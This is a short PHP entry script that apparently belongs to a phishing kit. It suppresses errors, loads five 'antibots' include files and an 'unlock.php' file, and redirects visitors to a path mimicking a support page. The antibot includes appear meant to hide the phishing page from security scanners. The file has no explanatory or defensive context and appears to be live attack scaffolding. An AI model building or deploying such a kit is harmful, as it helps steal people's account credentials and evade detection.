<?php
error_reporting(0);
include "boots/antibots1.php";
include "boots/antibots2.php";
include "boots/antibots3.php";
include "boots/antibots4.php";
include "boots/antibots5.php";
include('unlock.php');
 header('Location: supp/ort');
  exit();
?>